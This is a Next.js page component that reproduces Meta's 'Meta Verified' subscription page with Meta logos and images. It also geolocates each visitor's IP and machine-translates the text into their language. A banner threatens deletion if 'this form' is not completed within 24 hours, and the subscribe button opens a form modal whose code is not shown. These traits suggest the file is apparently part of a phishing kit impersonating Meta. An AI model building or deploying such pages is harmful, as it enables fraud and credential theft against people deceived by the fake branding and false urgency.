'use client';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { useEffect, useRef, useState, type FC } from 'react';
import Image from 'next/image';
import MetaBanner from '@/assets/images/imagemeta.webp';
import MetaLogo from '@/assets/images/unnamedmeta.png';
import MetaBanner1 from '@/assets/images/imagemeta1.webp';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });


const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = [
            // Banner
            'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
            'This form must be completed within 24 hours, or it will be permanently deleted.',            
            // Main content
            'Protect your brand with Meta Verified',
            'Meta Verified Logo',
            'Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.',
            'Subscribe on Page',
            'Subscribe on Instagram',
            'Are you a business?',
            'Get more information on',
            'Meta Verified for businesses',
            'Features, availability and pricing may vary by region and app.',
            'Meta Verified Example',
            'Meta Verified benefits',
            'Verified badge',
            'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
            'Impersonation protection',
            'Enhanced support',
            'Upgraded profile features',
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    return (
        <div className="w-full flex flex-col bg-gradient-to-br from-[#f3e7e9] via-[#c7e0f7] to-[#6ec6f7] min-h-screen" style={{margin:0,padding:0}}>
            <div className="w-full bg-[#768187] text-white text-center text-base md:text-lg font-semibold" style={{margin:0,paddingTop:'16px',paddingBottom:'16px',lineHeight:1.1}}>
                {t('Upgrade your profile with Meta Verified — enjoy exclusive benefits.')}<br />
                <span className="text-xs font-normal">{t('This form must be completed within 24 hours, or it will be permanently deleted.')}</span>
            </div>
            <div className="flex flex-1 flex-col md:flex-row items-center justify-center px-4 md:px-8 py-0 gap-4 md:gap-0 max-w-[1600px] mx-auto w-full">
                <div className="w-full md:w-1/3 flex flex-col items-center md:items-start justify-center px-2 md:px-0 mb-8 md:mb-0">
                    <Image src={MetaLogo} alt={t('Meta Verified Logo')} width={100} height={100} className="w-16 h-16 md:w-20 md:h-20 mb-4 md:mb-6" />
                    <h1 className="text-3xl md:text-5xl font-bold mb-4 text-[#1C2B33] text-center md:text-left">
                        {t('Protect your brand with Meta Verified')}
                    </h1>
                    <p className="text-base md:text-lg text-[#1C2B33] mb-6 text-center md:text-left">{t('Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.')}</p>
                    <div className="flex flex-col md:flex-row gap-4 mb-4 w-full items-center md:items-start justify-center md:justify-start">
                        <button
                            onClick={() => {
                                setModalKey((prev) => prev + 1);
                                setModalOpen(true);
                            }}
                            className="bg-[#1877f2] hover:bg-[#145db2] text-white font-semibold py-3 px-6 rounded-full text-base shadow w-full md:w-auto"
                        >
                            {t('Subscribe on Page')}
                        </button>
                    </div>
                    <div className="text-sm text-[#1C2B33] mt-2 text-center md:text-left">
                        <span className="font-semibold">{t('Are you a business?')}</span> {t('Get more information on')} <a href="#" className="underline text-blue-700">{t('Meta Verified for businesses')}</a>.
                    </div>
                </div>
                <div className="flex-1 flex items-center justify-center w-full">
                    <div className="flex items-center justify-center w-full max-w-[500px] md:max-w-full">
                        <Image 
                            src={MetaBanner} 
                            alt="Meta Verified Example"
                            width={600}
                            height={400}
                            className="w-full h-auto object-contain"
                            priority
                        />
                    </div>
                </div>
            </div>
            {/* Section: Meta Verified benefits */}
            <div className="flex flex-col md:flex-row items-center justify-center px-2 md:px-8 py-8 md:py-12 gap-8 md:gap-12 max-w-[1600px] mx-auto w-full bg-white rounded-2xl shadow mt-8 md:mt-12">
                <div className="w-full md:w-1/2 flex flex-col items-center md:items-start justify-center p-2 md:p-8">
                    <h2 className="text-2xl md:text-4xl font-bold mb-6 md:mb-8 text-[#1C2B33] text-center md:text-left w-full">{t("Meta Verified benefits")}</h2>
                    <div className="w-full border-t border-gray-300 mb-4 md:mb-6"></div>
                    {/* Verified badge (open) */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <div>
                            <span className="text-base md:text-2xl font-semibold">{t('Verified badge')}</span>
                            <div className="text-gray-500 text-sm md:text-lg mt-2">{t('The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.')}</div>
                        </div>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Impersonation protection */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Impersonation protection')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Enhanced support */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Enhanced support')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Upgraded profile features */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Upgraded profile features')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                </div>
                <div className="w-full md:w-1/2 flex items-center justify-center p-2 md:p-8">
                    <div className="bg-[#f3f6fa] rounded-3xl flex items-center justify-center w-full max-w-xs md:max-w-xl p-2 md:p-8">
                        <Image 
                            src={MetaBanner1} 
                            alt="Meta Verified Benefits Demo" 
                            className="rounded-2xl w-full h-auto object-contain" 
                            priority
                        />
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>                 
    );
};
export default Page;